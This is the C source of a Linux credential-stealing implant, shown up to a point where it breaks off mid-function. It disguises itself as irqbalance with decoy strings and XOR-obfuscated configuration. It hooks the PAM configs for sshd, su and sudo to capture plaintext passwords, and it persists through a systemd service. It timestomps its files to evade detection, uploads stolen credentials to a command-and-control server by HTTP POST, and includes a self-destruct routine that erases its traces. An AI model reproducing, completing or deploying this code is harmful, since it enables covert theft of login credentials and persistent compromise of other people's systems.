#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <dirent.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "xor_config.h"

#ifndef EXFIL_INTERVAL
#define EXFIL_INTERVAL 3600
#endif

/* Decoy strings — .rodata only, no .dynsym symbols */
static const char __attribute__((used)) _irq_decoy[] =
    "/proc/interrupts\0"
    "/proc/stat\0"
    "/proc/irq/%i/smp_affinity\0"
    "/proc/irq/%i/node\0"
    "/sys/devices/system/cpu/online\0"
    "/sys/devices/system/cpu/isolated\0"
    "/sys/devices/system/cpu/nohz_full\0"
    "/sys/devices/system/cpu\0"
    "/sys/devices/system/cpu/%s\0"
    "/sys/devices/system/cpu/topology/core_siblings\0"
    "/sys/devices/system/cpu/topology/physical_package_id\0"
    "/sys/devices/system/cpu/cache/index%d/shared_cpu_map\0"
    "/sys/bus/pci/devices\0"
    "/sys/devices/platform/%s/\0"
    "legacy\0" "storage\0" "video\0" "ethernet\0"
    "gbit-ethernet\0" "10gbit-ethernet\0" "virt-event\0" "other\0"
    "Level\0" "Edge\0" "MSI\0" "-event\0" "xen-dyn\0"
    "IRQBALANCE_ONESHOT\0"
    "IRQBALANCE_DEBUG\0"
    "IRQBALANCE_BANNED_CPUS\0"
    "IRQBALANCE_BANNED_CPULIST\0"
    "INVOCATION_ID\0"
    "Balancing is ineffective on systems with a single cpu.  Shutting down\0"
    "This machine seems not NUMA capable.\0"
    "Irqbalance hasn't been executed under root privileges, thus it won't "
    "in fact balance interrupts.\0"
    "WARNING cant open /proc/stat. balancing is broken\0"
    "WARNING read /proc/stat. balancing is broken\0"
    "WARNING, didn't collect load info for all cpus, balancing is broken\0"
    "WARNING: MSI interrupts found in /proc/interrupts\0"
    "But none found in sysfs, you need to update your kernel\0"
    "Until then, IRQs will be improperly classified\0"
    "WARNING: Platform device path in /sys exceeds PATH_MAX, cannot examine\0"
    "IRQ %d has an unknown node\0"
    "Adding IRQ %d to database\0"
    "Cannot change IRQ %i affinity: %s\0"
    "IRQ %i affinity is now unmanaged\0"
    "Package %i:  numa_node\0"
    "Cache domain %i:  numa_node is\0"
    "cpu mask is %s  (load %lu)\0"
    "Interrupt %i node_num is %d (%s/%" "PRIu64" ":%" "PRIu64" ")\0"
    "CPU number %i  numa_node is\0"
    "IRQ %s is of type %d and class %d\0"
    "IRQ %s(%d) guessed as class %d\0"
    "IRQ %d: Override %s to %s\0"
    "Prevent irq assignment to these isolated CPUs: %s\0"
    "Prevent irq assignment to these adaptive-ticks CPUs: %s\0"
    "Prevent irq assignment to these thermal-banned CPUs: %s\0"
    "Banned CPUs: %s\0"
    "No directory %s: %s\0"
    "Checking entry %s\0"
    "package_mask with different physical_package_id found!\0"
    "none\0" "package\0" "cache\0" "core\0"
    "sleep_interval\0" "power_thresh\0" "migrate_ratio\0"
    "deepest_cache\0" "ban irqs\0" "cpus\0"
    "irqbalance\0"
    "irqbalance-ui\0"
;

enum os_family { OS_DEBIAN, OS_REDHAT, OS_UNKNOWN };

struct sys_paths {
    char pam_dir[128];
    char systemd_dir[128];
    char target_dir[128];
    char lib_dir[128];
};

static enum os_family detect_os(struct sys_paths *paths) {
    char os_release[OBF_OS_RELEASE_LEN + 1];
    xor_decode(os_release, OBF_OS_RELEASE, OBF_OS_RELEASE_LEN);

    FILE *fp = fopen(os_release, "r");
    explicit_bzero(os_release, sizeof(os_release));

    char line[256];
    char os_id[256] = {0};

    if (fp) {
        char id_pfx[OBF_ID_PREFIX_LEN + 1];
        xor_decode(id_pfx, OBF_ID_PREFIX, OBF_ID_PREFIX_LEN);
        while (fgets(line, sizeof(line), fp)) {
            if (strncmp(line, id_pfx, OBF_ID_PREFIX_LEN) == 0) {
                char *val = line + OBF_ID_PREFIX_LEN;
                if (*val == '"') val++;
                strncpy(os_id, val, sizeof(os_id) - 1);
                os_id[strcspn(os_id, "\"\n")] = 0;
                break;
            }
        }
        explicit_bzero(id_pfx, sizeof(id_pfx));
        fclose(fp);
    }

    {
        char s[16];
        int match = 0;
        xor_decode(s, OBF_OS_UBUNTU, OBF_OS_UBUNTU_LEN);
        if (strstr(os_id, s)) match = 1;
        xor_decode(s, OBF_OS_DEBIAN, OBF_OS_DEBIAN_LEN);
        if (strstr(os_id, s)) match = 1;
        xor_decode(s, OBF_OS_KALI, OBF_OS_KALI_LEN);
        if (strstr(os_id, s)) match = 1;
        xor_decode(s, OBF_OS_PARROT, OBF_OS_PARROT_LEN);
        if (strstr(os_id, s)) match = 1;
        explicit_bzero(s, sizeof(s));

        if (match) {
            xor_decode(paths->pam_dir, OBF_PAM_DIR_DEB, OBF_PAM_DIR_DEB_LEN);
            xor_decode(paths->systemd_dir, OBF_SYSTEMD_DIR_DEB, OBF_SYSTEMD_DIR_DEB_LEN);
            xor_decode(paths->target_dir, OBF_TARGET_DIR_DEB, OBF_TARGET_DIR_DEB_LEN);
            xor_decode(paths->lib_dir, OBF_LIB_DIR_DEB, OBF_LIB_DIR_DEB_LEN);
            return OS_DEBIAN;
        }
    }

    {
        char s[16];
        int match = 0;
        xor_decode(s, OBF_OS_CENTOS, OBF_OS_CENTOS_LEN);
        if (strstr(os_id, s)) match = 1;
        xor_decode(s, OBF_OS_RHEL, OBF_OS_RHEL_LEN);
        if (strstr(os_id, s)) match = 1;
        xor_decode(s, OBF_OS_ROCKY, OBF_OS_ROCKY_LEN);
        if (strstr(os_id, s)) match = 1;
        xor_decode(s, OBF_OS_ALMA, OBF_OS_ALMA_LEN);
        if (strstr(os_id, s)) match = 1;
        xor_decode(s, OBF_OS_FEDORA, OBF_OS_FEDORA_LEN);
        if (strstr(os_id, s)) match = 1;
        explicit_bzero(s, sizeof(s));

        if (match) {
            xor_decode(paths->pam_dir, OBF_PAM_DIR_RH, OBF_PAM_DIR_RH_LEN);
            xor_decode(paths->systemd_dir, OBF_SYSTEMD_DIR_RH, OBF_SYSTEMD_DIR_RH_LEN);
            xor_decode(paths->target_dir, OBF_TARGET_DIR_RH, OBF_TARGET_DIR_RH_LEN);
            xor_decode(paths->lib_dir, OBF_LIB_DIR_RH, OBF_LIB_DIR_RH_LEN);
            return OS_REDHAT;
        }
    }

    {
        char check[OBF_PAM_DIR_RH_LEN + 1];
        xor_decode(check, OBF_PAM_DIR_RH, OBF_PAM_DIR_RH_LEN);
        struct stat st;
        if (stat(check, &st) == 0)
            strncpy(paths->pam_dir, check, sizeof(paths->pam_dir));
        else
            xor_decode(paths->pam_dir, OBF_PAM_DIR_FB, OBF_PAM_DIR_FB_LEN);
        explicit_bzero(check, sizeof(check));
    }
    xor_decode(paths->systemd_dir, OBF_SYSTEMD_DIR_FB, OBF_SYSTEMD_DIR_FB_LEN);
    xor_decode(paths->target_dir, OBF_TARGET_DIR_FB, OBF_TARGET_DIR_FB_LEN);
    xor_decode(paths->lib_dir, OBF_LIB_DIR_DEB, OBF_LIB_DIR_DEB_LEN);
    return OS_UNKNOWN;
}

static void get_local_ip(char *buf, size_t size) {
    char unknown[OBF_UNKNOWN_LEN + 1];
    char dns_probe[OBF_DNS_PROBE_LEN + 1];
    xor_decode(unknown, OBF_UNKNOWN, OBF_UNKNOWN_LEN);
    strncpy(buf, unknown, size);
    explicit_bzero(unknown, sizeof(unknown));

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;

    struct sockaddr_in target;
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(53);
    xor_decode(dns_probe, OBF_DNS_PROBE, OBF_DNS_PROBE_LEN);
    inet_pton(AF_INET, dns_probe, &target.sin_addr);
    explicit_bzero(dns_probe, sizeof(dns_probe));

    if (connect(sock, (struct sockaddr *)&target, sizeof(target)) == 0) {
        struct sockaddr_in local;
        socklen_t len = sizeof(local);
        if (getsockname(sock, (struct sockaddr *)&local, &len) == 0)
            inet_ntop(AF_INET, &local.sin_addr, buf, size);
    }

    close(sock);
}

static int capture_credentials(void) {
    char pass[4096] = {0};
    if (fgets(pass, sizeof(pass), stdin) == NULL)
        return 0;
    pass[strcspn(pass, "\n")] = 0;

    char pam_user_var[OBF_PAM_USER_LEN + 1];
    xor_decode(pam_user_var, OBF_PAM_USER, OBF_PAM_USER_LEN);
    const char *user = getenv(pam_user_var);
    explicit_bzero(pam_user_var, sizeof(pam_user_var));

    char pam_rhost_var[OBF_PAM_RHOST_LEN + 1];
    xor_decode(pam_rhost_var, OBF_PAM_RHOST, OBF_PAM_RHOST_LEN);
    const char *host = getenv(pam_rhost_var);
    explicit_bzero(pam_rhost_var, sizeof(pam_rhost_var));

    if (!user || !pass[0])
        return 0;

    char log_fmt[OBF_LOG_FMT_LEN + 1];
    xor_decode(log_fmt, OBF_LOG_FMT, OBF_LOG_FMT_LEN);

    char local_str[OBF_LOCAL_LEN + 1];
    xor_decode(local_str, OBF_LOCAL, OBF_LOCAL_LEN);

    char plaintext[1024];
    int plen = snprintf(plaintext, sizeof(plaintext),
        log_fmt, user, pass, host ? host : local_str);

    explicit_bzero(log_fmt, sizeof(log_fmt));
    explicit_bzero(local_str, sizeof(local_str));
    explicit_bzero(pass, sizeof(pass));

    if (plen <= 0 || (size_t)plen >= sizeof(plaintext))
        return 0;

    unsigned char encrypted[1024];
    memcpy(encrypted, plaintext, plen);
    xor_crypt(encrypted, plen);
    explicit_bzero(plaintext, sizeof(plaintext));

    char workdir[OBF_WORKDIR_LEN + 1];
    xor_decode(workdir, OBF_WORKDIR, OBF_WORKDIR_LEN);
    mkdir(workdir, 0700);
    explicit_bzero(workdir, sizeof(workdir));

    char logpath[OBF_AUTH_BUF_LEN + 1];
    xor_decode(logpath, OBF_AUTH_BUF, OBF_AUTH_BUF_LEN);

    struct stat st;
    int needs_header = (stat(logpath, &st) != 0 || st.st_size == 0);

    FILE *fp = fopen(logpath, "ab");
    if (fp) {
        if (needs_header) {
            const unsigned char hdr[32] = {
                0x7F,'E','L','F', 0x02,0x01,0x01,0x00,
                0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
                0x03,0x00,0x3E,0x00, 0x01,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00
            };
            fwrite(hdr, 1, 32, fp);
        }

        unsigned short entry_len = (unsigned short)plen;
        fwrite(&entry_len, 2, 1, fp);
        fwrite(encrypted, 1, plen, fp);
        fclose(fp);
    }

    explicit_bzero(encrypted, sizeof(encrypted));
    explicit_bzero(logpath, sizeof(logpath));

    return 0;
}

static void timestomp(const char *src, const char *dst) {
    struct stat st;
    if (stat(src, &st) == 0) {
        struct timespec times[2] = { st.st_atim, st.st_mtim };
        utimensat(AT_FDCWD, dst, times, 0);
    }
}

static int write_embedded(const char *path, const unsigned char *data, unsigned int len, mode_t mode) {
    int fd = open(path, O_WRONLY | O_TRUNC);
    if (fd < 0)
        fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, mode);
    if (fd < 0) return -1;
    size_t written = 0;
    while (written < len) {
        ssize_t n = write(fd, data + written, len - written);
        if (n <= 0) { close(fd); return -1; }
        written += n;
    }
    close(fd);
    return 0;
}

static unsigned char *read_file(const char *path, size_t *out_size) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return NULL;
    struct stat st;
    if (fstat(fd, &st) < 0) { close(fd); return NULL; }
    unsigned char *buf = malloc(st.st_size);
    if (!buf) { close(fd); return NULL; }
    size_t total = 0;
    while (total < (size_t)st.st_size) {
        ssize_t n = read(fd, buf + total, st.st_size - total);
        if (n <= 0) { free(buf); close(fd); return NULL; }
        total += n;
    }
    close(fd);
    *out_size = total;
    return buf;
}

static unsigned int jittered_sleep(unsigned int base_interval) {
    unsigned int jitter_range = base_interval / 5;
    if (jitter_range == 0) return base_interval;
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)getpid();
    unsigned int jitter = seed % (jitter_range * 2);
    return base_interval - jitter_range + jitter;
}

static void install_pam_hook(const char *pam_config, const char *hook_line, const char *soname) {
    FILE *fp = fopen(pam_config, "r");
    if (!fp) return;

    char *buf = malloc(65536);
    if (!buf) { fclose(fp); return; }

    int offset = 0;
    char line[512];
    int inserted = 0;
    int found_existing = 0;

    char auth_prefix[OBF_AUTH_PREFIX_LEN + 1];
    xor_decode(auth_prefix, OBF_AUTH_PREFIX, OBF_AUTH_PREFIX_LEN);

    char common_auth[OBF_COMMON_AUTH_LEN + 1];
    xor_decode(common_auth, OBF_COMMON_AUTH, OBF_COMMON_AUTH_LEN);

    char system_auth[OBF_SYSTEM_AUTH_LEN + 1];
    xor_decode(system_auth, OBF_SYSTEM_AUTH, OBF_SYSTEM_AUTH_LEN);

    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, soname)) {
            found_existing = 1;
            break;
        }

        int len = strlen(line);
        if (offset + len < 65536) {
            memcpy(buf + offset, line, len);
            offset += len;
        }

        if (!inserted && (strncmp(line, auth_prefix, strlen(auth_prefix)) == 0 ||
            strstr(line, common_auth) != NULL ||
            strstr(line, system_auth) != NULL)) {
            int hook_len = strlen(hook_line);
            if (offset + hook_len + 1 < 65536) {
                memcpy(buf + offset, hook_line, hook_len);
                offset += hook_len;
                buf[offset++] = '\n';
                inserted = 1;
            }
        }
    }

    if (found_existing) {
        explicit_bzero(auth_prefix, sizeof(auth_prefix));
        free(buf);
        fclose(fp);
        return;
    }

    while (fgets(line, sizeof(line), fp)) {
        int len = strlen(line);
        if (offset + len < 65536) {
            memcpy(buf + offset, line, len);
            offset += len;
        }
    }
    fclose(fp);

    if (!inserted) {
        int hook_len = strlen(hook_line);
        if (offset + hook_len + 1 < 65536) {
            memcpy(buf + offset, hook_line, hook_len);
            offset += hook_len;
            buf[offset++] = '\n';
        }
    }

    struct stat orig_st;
    int has_time = (stat(pam_config, &orig_st) == 0);

    fp = fopen(pam_config, "w");
    if (fp) {
        fwrite(buf, 1, offset, fp);
        fclose(fp);
    }

    if (has_time) {
        struct timespec times[2] = { orig_st.st_atim, orig_st.st_mtim };
        utimensat(AT_FDCWD, pam_config, times, 0);
    }

    explicit_bzero(auth_prefix, sizeof(auth_prefix));
    explicit_bzero(buf, offset);
    explicit_bzero(common_auth, sizeof(common_auth));
    explicit_bzero(system_auth, sizeof(system_auth));

    free(buf);
}

#ifdef DESTRUCT_TIME
static void remove_pam_hook(const char *pam_config, const char *soname) {
    struct stat orig_st;
    int has_time = (stat(pam_config, &orig_st) == 0);

    FILE *fp = fopen(pam_config, "r");
    if (!fp) return;

    char *clean_buf = malloc(65536);
    if (!clean_buf) { fclose(fp); return; }

    int offset = 0;
    char line[512];
    while (fgets(line, sizeof(line), fp)) {
        if (!strstr(line, soname)) {
            int len = strlen(line);
            if (offset + len < 65536) {
                memcpy(clean_buf + offset, line, len);
                offset += len;
            }
        }
    }
    fclose(fp);

    fp = fopen(pam_config, "w");
    if (fp) {
        fwrite(clean_buf, 1, offset, fp);
        fclose(fp);
    }
    free(clean_buf);

    if (has_time) {
        struct timespec times[2] = { orig_st.st_atim, orig_st.st_mtim };
        utimensat(AT_FDCWD, pam_config, times, 0);
    }
}
#endif

static void create_systemd_service(const struct sys_paths *paths, const char *bin_path) {
    char svc_file[OBF_SVC_FILE_LEN + 1];
    xor_decode(svc_file, OBF_SVC_FILE, OBF_SVC_FILE_LEN);

    char path_fmt[OBF_PATH_FMT_LEN + 1];
    xor_decode(path_fmt, OBF_PATH_FMT, OBF_PATH_FMT_LEN);

    char svc_path[256];
    snprintf(svc_path, sizeof(svc_path), path_fmt, paths->systemd_dir, svc_file);

    char svc_tmpl[OBF_SVC_TEMPLATE_LEN + 1];
    xor_decode(svc_tmpl, OBF_SVC_TEMPLATE, OBF_SVC_TEMPLATE_LEN);

    FILE *fp = fopen(svc_path, "w");
    if (!fp) {
        explicit_bzero(svc_tmpl, sizeof(svc_tmpl));
        explicit_bzero(svc_file, sizeof(svc_file));
        explicit_bzero(path_fmt, sizeof(path_fmt));
        return;
    }
    fprintf(fp, svc_tmpl, bin_path);
    fclose(fp);
    explicit_bzero(svc_tmpl, sizeof(svc_tmpl));

    char sshd_svc[OBF_SSHD_SVC_LEN + 1];
    xor_decode(sshd_svc, OBF_SSHD_SVC, OBF_SSHD_SVC_LEN);
    char ref_svc[256];
    snprintf(ref_svc, sizeof(ref_svc), path_fmt, paths->systemd_dir, sshd_svc);
    timestomp(ref_svc, svc_path);
    explicit_bzero(sshd_svc, sizeof(sshd_svc));

    char wants_dir[OBF_WANTS_DIR_LEN + 1];
    xor_decode(wants_dir, OBF_WANTS_DIR, OBF_WANTS_DIR_LEN);
    mkdir(wants_dir, 0755);

    char link_path[512];
    snprintf(link_path, sizeof(link_path), path_fmt, wants_dir, svc_file);
    unlink(link_path);
    symlink(svc_path, link_path);

    explicit_bzero(wants_dir, sizeof(wants_dir));
    explicit_bzero(svc_file, sizeof(svc_file));
    explicit_bzero(path_fmt, sizeof(path_fmt));
}

static int http_post_file(const char *ip, int port, const char *endpoint,
                          const unsigned char *data, size_t data_len,
                          const char *filename, const char *auth_token) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    struct timeval tv = { .tv_sec = 30, .tv_usec = 0 };
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &addr.sin_addr) <= 0) { close(sock); return -1; }
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) { close(sock); return -1; }

    char boundary[OBF_BOUNDARY_LEN + 1];
    xor_decode(boundary, OBF_BOUNDARY, OBF_BOUNDARY_LEN);

    char body_pfx_fmt[OBF_HTTP_BODY_PFX_LEN + 1];
    xor_decode(body_pfx_fmt, OBF_HTTP_BODY_PFX, OBF_HTTP_BODY_PFX_LEN);

    char body_sfx_fmt[OBF_HTTP_BODY_SFX_LEN + 1];
    xor_decode(body_sfx_fmt, OBF_HTTP_BODY_SFX, OBF_HTTP_BODY_SFX_LEN);

    char hdr_fmt[OBF_HTTP_HEADERS_LEN + 1];
    xor_decode(hdr_fmt, OBF_HTTP_HEADERS, OBF_HTTP_HEADERS_LEN);

    char body_prefix[512];
    int bp_len = snprintf(body_prefix, sizeof(body_prefix), body_pfx_fmt, boundary, filename);
    explicit_bzero(body_pfx_fmt, sizeof(body_pfx_fmt));

    char body_suffix[64];
    int bs_len = snprintf(body_suffix, sizeof(body_suffix), body_sfx_fmt, boundary);
    explicit_bzero(body_sfx_fmt, sizeof(body_sfx_fmt));

    size_t total_body = bp_len + data_len + bs_len;

    char headers[1024];
    int h_len = snprintf(headers, sizeof(headers), hdr_fmt,
        endpoint, ip, port, boundary, total_body, auth_token);
    explicit_bzero(hdr_fmt, sizeof(hdr_fmt));
    explicit_bzero(boundary, sizeof(boundary));

    if (send(sock, headers, h_len, MSG_NOSIGNAL) <= 0) { close(sock); return -1; }
    explicit_bzero(headers, sizeof(headers));

    if (send(sock, body_prefix, bp_len, MSG_NOSIGNAL) <= 0) { close(sock); return -1; }
    explicit_bzero(body_prefix, sizeof(body_prefix));

    size_t sent = 0;
    while (sent < data_len) {
        size_t chunk = data_len - sent;
        if (chunk > 4096) chunk = 4096;
        ssize_t n = send(sock, data + sent, chunk, MSG_NOSIGNAL);
        if (n <= 0) { close(sock); return -1; }
        sent += n;
    }
    if (send(sock, body_suffix, bs_len, MSG_NOSIGNAL) <= 0) { close(sock); return -1; }

    char resp[128];
    ssize_t rlen = recv(sock, resp, sizeof(resp) - 1, 0);
    close(sock);

    if (rlen <= 0) return -1;
    resp[rlen] = '\0';

    char ok_code[OBF_HTTP_200_LEN + 1];
    xor_decode(ok_code, OBF_HTTP_200, OBF_HTTP_200_LEN);
    int success = (strstr(resp, ok_code) != NULL);
    explicit_bzero(ok_code, sizeof(ok_code));

    return success ? 0 : -1;
}

static void exec_cmd(const char *path, char *const argv[]) {
    pid_t pid = fork();
    if (pid == 0) {
        char devnull[OBF_DEV_NULL_LEN + 1];
        xor_decode(devnull, OBF_DEV_NULL, OBF_DEV_NULL_LEN);
        int fd = open(devnull, O_WRONLY);
        explicit_bzero(devnull, sizeof(devnull));
        if (fd >= 0) {
            dup2(fd, STDOUT_FILENO);
            dup2(fd, STDERR_FILENO);
            close(fd);
        }
        execv(path, argv);
        _exit(0);
    }
    if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);
    }
}

static void do_install(const struct sys_paths *paths) {
    char workdir[OBF_WORKDIR_LEN + 1];
    xor_decode(workdir, OBF_WORKDIR, OBF_WORKDIR_LEN);

    char svc_name[OBF_SVC_NAME_LEN + 1];
    xor_decode(svc_name, OBF_SVC_NAME, OBF_SVC_NAME_LEN);

    char path_fmt[OBF_PATH_FMT_LEN + 1];
    xor_decode(path_fmt, OBF_PATH_FMT, OBF_PATH_FMT_LEN);

    char svc_file[OBF_SVC_FILE_LEN + 1];
    xor_decode(svc_file, OBF_SVC_FILE, OBF_SVC_FILE_LEN);

    {
        char systemctl[OBF_SYSTEMCTL_LEN + 1];
        xor_decode(systemctl, OBF_SYSTEMCTL, OBF_SYSTEMCTL_LEN);

        char stop[OBF_STOP_LEN + 1];
        xor_decode(stop, OBF_STOP, OBF_STOP_LEN);

        char disable[OBF_DISABLE_LEN + 1];
        xor_decode(disable, OBF_DISABLE, OBF_DISABLE_LEN);

        char sc_usr[OBF_SYSTEMCTL_USR_LEN + 1];
        xor_decode(sc_usr, OBF_SYSTEMCTL_USR, OBF_SYSTEMCTL_USR_LEN);

        char *argv_stop[] = { systemctl, stop, svc_file, NULL };
        exec_cmd(sc_usr, argv_stop);

        char *argv_disable[] = { systemctl, disable, svc_file, NULL };
        exec_cmd(sc_usr, argv_disable);

        explicit_bzero(sc_usr, sizeof(sc_usr));
        explicit_bzero(systemctl, sizeof(systemctl));
        explicit_bzero(stop, sizeof(stop));
        explicit_bzero(disable, sizeof(disable));
    }

    mkdir(workdir, 0700);

    char self_target[256];
    snprintf(self_target, sizeof(self_target), path_fmt, paths->target_dir, svc_name);

    {
        size_t orig_size = 0;
        unsigned char *orig_data = read_file(self_target, &orig_size);
        if (orig_data && orig_size > 0) {
            char orig_bin_name[OBF_ORIG_BIN_LEN + 1];
            xor_decode(orig_bin_name, OBF_ORIG_BIN, OBF_ORIG_BIN_LEN);
            char backup_path[256];
            snprintf(backup_path, sizeof(backup_path), path_fmt, workdir, orig_bin_name);
            write_embedded(backup_path, orig_data, orig_size, 0755);
            explicit_bzero(orig_bin_name, sizeof(orig_bin_name));
        }
        free(orig_data);

        char orig_svc_path[256];
        snprintf(orig_svc_path, sizeof(orig_svc_path), path_fmt, paths->systemd_dir, svc_file);
        orig_size = 0;
        orig_data = read_file(orig_svc_path, &orig_size);
        if (orig_data && orig_size > 0) {
            char orig_svc_name[OBF_ORIG_SVC_LEN + 1];
            xor_decode(orig_svc_name, OBF_ORIG_SVC, OBF_ORIG_SVC_LEN);
            char backup_path[256];
            snprintf(backup_path, sizeof(backup_path), path_fmt, workdir, orig_svc_name);
            write_embedded(backup_path, orig_data, orig_size, 0644);
            explicit_bzero(orig_svc_name, sizeof(orig_svc_name));
        }
        free(orig_data);
    }

    char proc_self[OBF_PROC_SELF_LEN + 1];
    xor_decode(proc_self, OBF_PROC_SELF, OBF_PROC_SELF_LEN);
    size_t self_size = 0;
    unsigned char *self_data = read_file(proc_self, &self_size);
    explicit_bzero(proc_self, sizeof(proc_self));

    if (self_data) {
        write_embedded(self_target, self_data, self_size, 0755);
        free(self_data);

        char bin_ls[OBF_BIN_LS_LEN + 1];
        xor_decode(bin_ls, OBF_BIN_LS, OBF_BIN_LS_LEN);
        timestomp(bin_ls, self_target);
        explicit_bzero(bin_ls, sizeof(bin_ls));
    }

    {
        char pam_line_fmt[OBF_PAM_LINE_LEN + 1];
        xor_decode(pam_line_fmt, OBF_PAM_LINE, OBF_PAM_LINE_LEN);

        char pam_hook_line[512];
        snprintf(pam_hook_line, sizeof(pam_hook_line), pam_line_fmt, self_target);
        explicit_bzero(pam_line_fmt, sizeof(pam_line_fmt));

        char pam_sshd[OBF_PAM_SSHD_LEN + 1];
        xor_decode(pam_sshd, OBF_PAM_SSHD, OBF_PAM_SSHD_LEN);
        install_pam_hook(pam_sshd, pam_hook_line, svc_name);
        explicit_bzero(pam_sshd, sizeof(pam_sshd));

        char pam_su[OBF_PAM_SU_LEN + 1];
        xor_decode(pam_su, OBF_PAM_SU, OBF_PAM_SU_LEN);
        install_pam_hook(pam_su, pam_hook_line, svc_name);
        explicit_bzero(pam_su, sizeof(pam_su));

        char pam_sudo[OBF_PAM_SUDO_LEN + 1];
        xor_decode(pam_sudo, OBF_PAM_SUDO, OBF_PAM_SUDO_LEN);
        install_pam_hook(pam_sudo, pam_hook_line, svc_name);
        explicit_bzero(pam_sudo, sizeof(pam_sudo));

        explicit_bzero(pam_hook_line, sizeof(pam_hook_line));
    }

    create_systemd_service(paths, self_target);

    explicit_bzero(workdir, sizeof(workdir));
    explicit_bzero(svc_name, sizeof(svc_name));
    explicit_bzero(svc_file, sizeof(svc_file));
    explicit_bzero(path_fmt, sizeof(path_fmt));
}

#ifdef DESTRUCT_TIME

static void remove_dir_contents(const char *dirpath) {
    DIR *dir = opendir(dirpath);
    if (!dir) return;
    struct dirent *ent;
    char path_fmt[OBF_PATH_FMT_LEN + 1];
    xor_decode(path_fmt, OBF_PATH_FMT, OBF_PATH_FMT_LEN);
    while ((ent = readdir(dir)) != NULL) {
        if (ent->d_name[0] == '.' &&
            (ent->d_name[1] == '\0' ||
            (ent->d_name[1] == '.' && ent->d_name[2] == '\0')))
            continue;
        char filepath[512];
        snprintf(filepath, sizeof(filepath), path_fmt, dirpath, ent->d_name);
        unlink(filepath);
    }
    explicit_bzero(path_fmt, sizeof(path_fmt));
    closedir(dir);
    rmdir(dirpath);
}

static void self_destruct(const struct sys_paths *paths,
                          const char *c2_ip, int c2_port, const char *endpoint,
                          const char *auth_token) {
    char workdir[OBF_WORKDIR_LEN + 1];
    xor_decode(workdir, OBF_WORKDIR, OBF_WORKDIR_LEN);

    char svc_name[OBF_SVC_NAME_LEN + 1];
    xor_decode(svc_name, OBF_SVC_NAME, OBF_SVC_NAME_LEN);

    char svc_file[OBF_SVC_FILE_LEN + 1];
    xor_decode(svc_file, OBF_SVC_FILE, OBF_SVC_FILE_LEN);

    char auth_buf_path[OBF_AUTH_BUF_LEN + 1];
    xor_decode(auth_buf_path, OBF_AUTH_BUF, OBF_AUTH_BUF_LEN);

    char path_fmt[OBF_PATH_FMT_LEN + 1];
    xor_decode(path_fmt, OBF_PATH_FMT, OBF_PATH_FMT_LEN);

    /* 1. final exfil */
    {
        size_t auth_size = 0;
        unsigned char *auth_data = NULL;
        if (access(auth_buf_path, F_OK) == 0)
            auth_data = read_file(auth_buf_path, &auth_size);
        if (auth_size > 0 && auth_data) {
            char filename[256];
            char hostname[128];
            char unknown[OBF_UNKNOWN_LEN + 1];
            xor_decode(unknown, OBF_UNKNOWN, OBF_UNKNOWN_LEN);
            if (gethostname(hostname, sizeof(hostname)) != 0)
                strncpy(hostname, unknown, sizeof(hostname));
            explicit_bzero(unknown, sizeof(unknown));

            char final_fmt[OBF_FINAL_LOG_FMT_LEN + 1];
            xor_decode(final_fmt, OBF_FINAL_LOG_FMT, OBF_FINAL_LOG_FMT_LEN);
            snprintf(filename, sizeof(filename), final_fmt, hostname);
            explicit_bzero(final_fmt, sizeof(final_fmt));

            http_post_file(c2_ip, c2_port, endpoint, auth_data, auth_size, filename, auth_token);
        }
        free(auth_data);
    }

    /* 2. restore PAM configs */
    {
        char pam_sshd[OBF_PAM_SSHD_LEN + 1];
        xor_decode(pam_sshd, OBF_PAM_SSHD, OBF_PAM_SSHD_LEN);
        remove_pam_hook(pam_sshd, svc_name);
        explicit_bzero(pam_sshd, sizeof(pam_sshd));

        char pam_su[OBF_PAM_SU_LEN + 1];
        xor_decode(pam_su, OBF_PAM_SU, OBF_PAM_SU_LEN);
        remove_pam_hook(pam_su, svc_name);
        explicit_bzero(pam_su, sizeof(pam_su));

        char pam_sudo[OBF_PAM_SUDO_LEN + 1];
        xor_decode(pam_sudo, OBF_PAM_SUDO, OBF_PAM_SUDO_LEN);
        remove_pam_hook(pam_sudo, svc_name);
        explicit_bzero(pam_sudo, sizeof(pam_sudo));
    }

    /* 3. restore original binary + service */
    {
        int restored = 0;

        char orig_bin_name[OBF_ORIG_BIN_LEN + 1];
        xor_decode(orig_bin_name, OBF_ORIG_BIN, OBF_ORIG_BIN_LEN);
        char backup_bin[256];
        snprintf(backup_bin, sizeof(backup_bin), path_fmt, workdir, orig_bin_name);
        explicit_bzero(orig_bin_name, sizeof(orig_bin_name));

        char self_path[256];
        snprintf(self_path, sizeof(self_path), path_fmt, paths->target_dir, svc_name);

        size_t orig_size = 0;
        unsigned char *orig_data = read_file(backup_bin, &orig_size);
        if (orig_data && orig_size > 0) {
            write_embedded(self_path, orig_data, orig_size, 0755);
            char bin_ls[OBF_BIN_LS_LEN + 1];
            xor_decode(bin_ls, OBF_BIN_LS, OBF_BIN_LS_LEN);
            timestomp(bin_ls, self_path);
            explicit_bzero(bin_ls, sizeof(bin_ls));
            restored = 1;
        }
        free(orig_data);

        char orig_svc_name[OBF_ORIG_SVC_LEN + 1];
